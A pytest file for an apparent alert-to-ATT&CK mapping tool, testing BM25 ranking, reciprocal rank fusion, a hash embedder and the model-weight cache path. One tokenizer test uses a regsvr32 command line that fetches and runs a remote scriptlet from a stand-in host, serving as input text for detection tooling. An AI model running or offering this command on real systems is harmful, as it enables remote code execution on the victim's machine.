"""BM25 and reciprocal rank fusion."""

from __future__ import annotations

import pytest

from alert2attack.retrieval.embedder import DEFAULT_CACHE, HashEmbedder, embedder_cache_dir
from alert2attack.retrieval.fusion import RRF_K, reciprocal_rank_fusion
from alert2attack.retrieval.lexical import BM25, tokenize

# -- tokenizing ---------------------------------------------------------------


def test_command_lines_split_on_anything_that_is_not_alphanumeric() -> None:
    tokens = tokenize(r"regsvr32.exe /s /u /i:http://x.example/a.sct scrobj.dll")
    assert {"regsvr32", "exe", "sct", "scrobj", "dll"} <= set(tokens)


def test_stopwords_are_dropped() -> None:
    assert tokenize("the adversary may use this to run it") == ["run"]


def test_plurals_fold_but_ss_words_do_not() -> None:
    assert tokenize("scripts") == ["script"]
    assert tokenize("access") == ["access"]


def test_tokenizing_is_case_insensitive() -> None:
    assert tokenize("PowerShell") == tokenize("powershell")


# -- BM25 ---------------------------------------------------------------------

DOCS = {
    "a": "powershell encoded command execution",
    "b": "credential dumping from lsass memory",
    "c": "scheduled task persistence at logon",
    "d": "powershell script downloads a payload",
}


def test_the_document_with_the_matching_terms_ranks_first() -> None:
    bm25 = BM25(DOCS)
    assert bm25.search("lsass memory dump")[0][0] == "b"


def test_a_rarer_term_outweighs_a_common_one() -> None:
    """'powershell' is in two documents; 'lsass' in one. The rare term is the signal."""
    bm25 = BM25(DOCS)
    ranked = [doc for doc, _ in bm25.search("powershell lsass")]
    assert ranked[0] == "b"


def test_no_match_returns_nothing() -> None:
    assert BM25(DOCS).search("zzz qqq") == []


def test_an_empty_query_returns_nothing() -> None:
    assert BM25(DOCS).search("") == []


def test_k_limits_results() -> None:
    assert len(BM25(DOCS).search("powershell", k=1)) == 1


def test_ranking_is_deterministic_on_ties() -> None:
    docs = {"z": "shared term", "a": "shared term", "m": "shared term"}
    assert [d for d, _ in BM25(docs).search("shared")] == ["a", "m", "z"]


def test_the_allowed_set_filters_results() -> None:
    ranked = BM25(DOCS).search("powershell", allowed={"d"})
    assert [d for d, _ in ranked] == ["d"]


def test_scores_are_positive() -> None:
    assert all(score > 0 for _, score in BM25(DOCS).search("powershell command"))


def test_an_empty_corpus_does_not_crash() -> None:
    assert BM25({}).search("anything") == []


# -- fusion -------------------------------------------------------------------


def test_a_document_both_channels_rank_beats_one_only_one_ranks_first() -> None:
    lexical = ["a", "b", "c"]
    dense = ["d", "b", "e"]
    fused = [doc for doc, _ in reciprocal_rank_fusion([lexical, dense])]
    assert fused[0] == "b", "agreement across channels is what RRF rewards"


def test_a_single_list_keeps_its_order() -> None:
    assert [d for d, _ in reciprocal_rank_fusion([["x", "y", "z"]])] == ["x", "y", "z"]


def test_the_score_is_the_sum_of_reciprocal_ranks() -> None:
    fused = dict(reciprocal_rank_fusion([["a", "b"], ["b", "a"]]))
    assert fused["a"] == pytest.approx(1 / (RRF_K + 1) + 1 / (RRF_K + 2))
    assert fused["a"] == pytest.approx(fused["b"])


def test_fusion_is_deterministic_on_ties() -> None:
    fused = [d for d, _ in reciprocal_rank_fusion([["b"], ["a"]])]
    assert fused == ["a", "b"]


def test_fusion_of_nothing_is_nothing() -> None:
    assert reciprocal_rank_fusion([]) == []
    assert reciprocal_rank_fusion([[], []]) == []


def test_fusion_ignores_scores_entirely() -> None:
    """Only ranks go in, which is why the two channels' scales never matter."""
    assert reciprocal_rank_fusion([["a", "b"]]) == reciprocal_rank_fusion([["a", "b"]])


# -- the hash embedder --------------------------------------------------------


def test_hash_embeddings_are_deterministic_across_instances() -> None:
    assert HashEmbedder().embed_query("regsvr32 scrobj") == HashEmbedder().embed_query("regsvr32 scrobj")


def test_hash_embeddings_are_unit_length() -> None:
    vec = HashEmbedder().embed_query("credential dumping from lsass")
    assert sum(v * v for v in vec) == pytest.approx(1.0)


def test_hash_embeddings_have_the_declared_dimension() -> None:
    embedder = HashEmbedder(dim=64)
    assert len(embedder.embed_query("x y z")) == embedder.dim == 64


def test_shared_words_are_closer_than_disjoint_ones() -> None:
    """Word overlap is all it can see, which is exactly why it is not a benchmark model."""
    e = HashEmbedder()
    q = e.embed_query("lsass credential dump")
    near = e.embed_query("dump credentials from lsass")
    far = e.embed_query("scheduled task at logon")
    dot = lambda a, b: sum(x * y for x, y in zip(a, b, strict=True))  # noqa: E731
    assert dot(q, near) > dot(q, far)


def test_an_empty_text_embeds_to_zeros_not_an_error() -> None:
    assert set(HashEmbedder().embed_query("")) == {0.0}


def test_document_and_query_embeddings_agree() -> None:
    e = HashEmbedder()
    assert e.embed_documents(["lsass dump"])[0] == e.embed_query("lsass dump")


# -- where model weights land -------------------------------------------------


def test_weights_default_to_a_gitignored_directory(monkeypatch: pytest.MonkeyPatch) -> None:
    """fastembed's own default is the system temp dir, which gets cleaned and would
    silently re-download the model."""
    monkeypatch.delenv("ALERT2ATTACK_EMBEDDER_CACHE", raising=False)
    assert embedder_cache_dir() == DEFAULT_CACHE
    assert DEFAULT_CACHE.startswith("datasets/raw/")


def test_the_cache_directory_can_be_overridden(monkeypatch: pytest.MonkeyPatch, tmp_path: object) -> None:
    monkeypatch.setenv("ALERT2ATTACK_EMBEDDER_CACHE", str(tmp_path))
    assert embedder_cache_dir() == str(tmp_path)
